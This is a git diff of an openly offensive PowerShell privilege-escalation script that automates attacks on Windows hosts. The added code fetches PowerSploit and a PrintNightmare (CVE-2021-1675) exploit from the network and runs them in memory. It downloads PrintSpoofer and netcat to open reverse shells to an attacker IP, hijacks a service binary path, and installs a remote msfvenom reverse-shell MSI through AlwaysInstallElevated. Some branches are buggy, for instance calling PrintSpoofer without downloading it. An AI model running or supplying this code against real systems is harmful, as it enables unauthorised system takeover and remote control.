@@ -5,7 +5,7 @@ smbserver.py . share -smb2support
 Victim Machine needs internet access, or specify if no internet access in on machine and if it can connect back to local machine, if so start python server
 
 .EXAMPLE
-Invoke-Everything-WinRM -attackerip 192.168.1.2 -lport 4444
+> Invoke-Everything-WinRM -attackerip 192.168.1.2 -lport 4444
 
 #>
 
@@ -30,17 +30,13 @@ Invoke-Everything-WinRM -attackerip 192.168.1.2 -lport 4444
     	
     	echo ""
 
-    	write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Putting PowerUp.ps1 in memory"
-    	echo ""
-
-    	iex (iwr -usebasicparsing https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1)
     	iex (iwr -usebasicparsing https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1)
     	$user = whoami /all > invoke-winrm.txt
     	$admin = get-adgroupmember "Domain Admins" >> invoke-winrm.txt
     	$local = net localgroup "Administrators" >> invoke-winrm.txt
     	$bit =  (Get-WMIObject win32_operatingsystem) | Select OSArchitecture >> invoke-winrm.txt
         $system = systeminfo >> invoke-winrm.txt
-    	echo ""
+        echo ""
     	
     	write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Seeing if user is within administrators group"
     	sleep 2
@@ -90,9 +86,8 @@ Invoke-Everything-WinRM -attackerip 192.168.1.2 -lport 4444
     		echo ""
     		sleep 10
     		mkdir C:\Windows\Temp
-    		cd C:\Windows\Temp
     		services >> invoke-winrm.txt
-    		wget -usebasicparsing https://github.com/int0x33/nc.exe/raw/master/nc64.exe -outfile nc64.exe
+    		wget -usebasicparsing https://github.com/int0x33/nc.exe/raw/master/nc64.exe -outfile C:\Windows\Temp\nc64.exe
     		echo ""
     		write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Downloading NC64.exe into C:\Windows\Temp"
     		sc.exe config vss binpath="C:\Windows\temp\nc64.exe -e cmd.exe $AttackerIP $LPORT"
@@ -183,7 +178,156 @@ Invoke-Everything-WinRM -attackerip 192.168.1.2 -lport 4444
     { 
     write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Need Attacker IP and LPORT ex: Invoke-Everything-WinRM -attackerip <your ip> -lport 4444"
     }
+    if ($user = "SeImpersonatePrivilege" -and $bit -contains "64-bit")
+    {
+        if (select-string "2019" invoke-winrm.txt)
+        {
+        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Machine is 2019 running PrintSpoofer"
+        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]$user has SeImpersonatePrivilege, exploiting now" >> invoke-winrm.txt
+        wget -usebasicparsing https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe -outfile C:\Windows\Temp\PrintSpoofer.exe
+        wget -usebasicparsing https://github.com/int0x33/nc.exe/raw/master/nc64.exe -outfile C:\Windows\Temp\nc64.exe
+        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Start nc listener on port $LPORT waiting 10 seconds ex (nc -lvnp $LPORT)"
+        echo ""
+        sleep 10
+        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Hopefully you have a shell"
+        C:\Windows\Temp\PrintSpoofer.exe -c "C:\Windows\Temp\nc64.exe $AttackerIP $LPORT -e cmd"
+        }
+        elseif (select-string "Windows 10" invoke-winrm.txt)
+        {
+        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Machine is Windows 10 running PrintSpoofer"
+        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]$user has SeImpersonatePrivilege, exploiting now" >> invoke-winrm.txt
+        wget -usebasicparsing https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe -outfile C:\Windows\Temp\PrintSpoofer.exe
+        wget -usebasicparsing https://github.com/int0x33/nc.exe/raw/master/nc64.exe -outfile C:\Windows\Temp\nc64.exe
+        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Start nc listener on port $LPORT waiting 10 seconds ex (nc -lvnp $LPORT)"
+        echo ""
+        sleep 10
+        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Hopefully you have a shell"
+        C:\Windows\Temp\PrintSpoofer.exe -c "C:\Windows\Temp\nc64.exe $AttackerIP $LPORT -e cmd"
+    }
+        elseif (select-string "2016" invoke-winrm.txt)
+        {
+        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Machine is 2016 running PrintSpoofer"
+        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]$user has SeImpersonatePrivilege, exploiting now" >> invoke-winrm.txt
+        wget -usebasicparsing https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe -outfile C:\Windows\Temp\PrintSpoofer.exe
+        wget -usebasicparsing https://github.com/int0x33/nc.exe/raw/master/nc64.exe -outfile C:\Windows\Temp\nc64.exe
+        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Start nc listener on port $LPORT waiting 10 seconds ex (nc -lvnp $LPORT)"
+        echo ""
+        sleep 10
+        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Hopefully you have a shell"
+        C:\Windows\Temp\PrintSpoofer.exe -c "C:\Windows\Temp\nc64.exe $AttackerIP $LPORT -e cmd"
+        }
+        elseif (select-string "2022" invoke-winrm.txt)
+        {
+        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Machine is 2022 running PrintSpoofer"
+        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]$user has SeImpersonatePrivilege, exploiting now" >> invoke-winrm.txt
+        wget -usebasicparsing https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe -outfile C:\Windows\Temp\PrintSpoofer.exe
+        wget -usebasicparsing https://github.com/int0x33/nc.exe/raw/master/nc64.exe -outfile C:\Windows\Temp\nc64.exe
+        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Start nc listener on port $LPORT waiting 10 seconds ex (nc -lvnp $LPORT)"
+        echo ""
+        sleep 10
+        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Hopefully you have a shell"
+        C:\Windows\Temp\PrintSpoofer.exe -c "C:\Windows\Temp\nc64.exe $AttackerIP $LPORT -e cmd"
+        }
+        elseif (select-string "Windows 7" invoke-winrm.txt)
+         {
+        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Machine is Windows 7 running Juicy Potato"
+        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]$user has SeImpersonatePrivilege, exploiting now" >> invoke-winrm.txt
+        #wget -usebasicparsing https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe -outfile C:\Windows\Temp\PrintSpoofer.exe
+        #wget -usebasicparsing https://github.com/int0x33/nc.exe/raw/master/nc64.exe -outfile C:\Windows\Temp\nc64.exe
+        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Start nc listener on port $LPORT waiting 10 seconds ex (nc -lvnp $LPORT)"
+        echo ""
+        sleep 10
+        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Hopefully you have a shell"
+        C:\Windows\Temp\PrintSpoofer.exe -c "C:\Windows\Temp\nc64.exe $AttackerIP $LPORT -e cmd"
+        }
+        elseif (select-string "2012" invoke-winrm.txt)
+        {
+        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Machine is Windows 2012 running Juicy Potato"
+        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]$user has SeImpersonatePrivilege, exploiting now" >> invoke-winrm.txt
+        #wget -usebasicparsing https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe -outfile C:\Windows\Temp\PrintSpoofer.exe
+        #wget -usebasicparsing https://github.com/int0x33/nc.exe/raw/master/nc64.exe -outfile C:\Windows\Temp\nc64.exe
+        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Start nc listener on port $LPORT waiting 10 seconds ex (nc -lvnp $LPORT)"
+        echo ""
+        sleep 10
+        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Hopefully you have a shell"
+        C:\Windows\Temp\PrintSpoofer.exe -c "C:\Windows\Temp\nc64.exe $AttackerIP $LPORT -e cmd"
+        }
+    }
+
+    #NEED TO ADD JUICY POTATO AND PRINTSPOOFER TO THIS LOWER AREA
+    if ($user = "SeImpersonatePrivilege" -and $bit -contains "32-bit")
+    {
+        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]$user has SeImpersonatePrivilege, exploiting now" >> invoke-winrm.txt
+        wget -usebasicparsing https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe -outfile C:\Windows\Temp\PrintSpoofer.exe
+        wget -usebasicparsing https://github.com/int0x33/nc.exe/raw/master/nc.exe -outfile C:\Windows\Temp\nc.exe
+        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Start nc listener on port $LPORT waiting 10 seconds ex (nc -lvnp $LPORT)"
+        echo ""
+        sleep 10
+        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Hopefully you have a shell"
+        C:\Windows\Temp\PrintSpoofer.exe -c "C:\Windows\Temp\nc.exe $AttackerIP $LPORT -e cmd"
+    }
+
+
+
+    write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Checking for PrintNightmare"
+    iex (iwr -usebasicparsing https://raw.githubusercontent.com/xbufu/PrintNightmareCheck/main/Invoke-NightmareCheck.ps1) >> invoke-winrm.txt
+    if (select-string "System is likely VULNERABLE!" invoke-winrm.txt)
+    {
+        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Exploiting PrintNightmare"
+        iex (iwr -usebasicparsing https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1)
+        invoke-nightmare
+    }
+    else
+    {
+        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Host most likely not vulnerable"
+    }
+    write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Checking for AlwaysInstallElevated"
+    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated >> invoke-winrm.txt
+    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated >> invoke-winrm.txt
+    if (select-string "0x1" invoke-winrm.txt)
+    {
+        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Registry has AlwaysInstallElevated on, exploiting"
+        if ($bit -contains "64-bit")
+        {
+            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Start webserver on port 80 on $AttackerIP"
+            echo ""
+            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Make file msfvenom -p windows/x64/shell/reverse_tcp LHOST=$AttackerIP LPORT=$LPORT > shell.msi"
+            echo ""
+            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Start nc listener on $LPORT"
+            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Waiting 30 seconds"
+            sleep 30
+            mkdir C:\Windows\Temp
+            echo ""
+            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Downloading shell.msi"
+            wget -usebasicparsing http://$AttackerIP/shell.msi -outfile C:\Windows\Temp\shell.msi
+            echo ""
+            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Hopefully you get a shell"
+            msiexec /quiet /qn /i C:\Windows\Temp\shell.msi
+        }
+        else
+        {
+            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Start webserver on port 80 on $AttackerIP"
+            echo ""
+            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Make file msfvenom -p windows/shell/reverse_tcp LHOST=$AttackerIP LPORT=$LPORT > shell.msi"
+            echo ""
+            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Start nc listener on $LPORT"
+            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Waiting 30 seconds"
+            sleep 30
+            mkdir C:\Windows\Temp
+            echo ""
+            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Downloading shell.msi"
+            wget -usebasicparsing http://$AttackerIP/shell.msi -outfile C:\Windows\Temp\shell.msi
+            echo ""
+            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Hopefully you get a shell"
+            msiexec /quiet /qn /i C:\Windows\Temp\shell.msi
+        }
+    }
+
+    write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Putting PowerUp.ps1 in memory"
+    echo ""
+    iex (iwr -usebasicparsing https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1)
     write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Running Invoke-AllChecks, may take a minute"
-    invoke-allchecks
+
 }
+
 
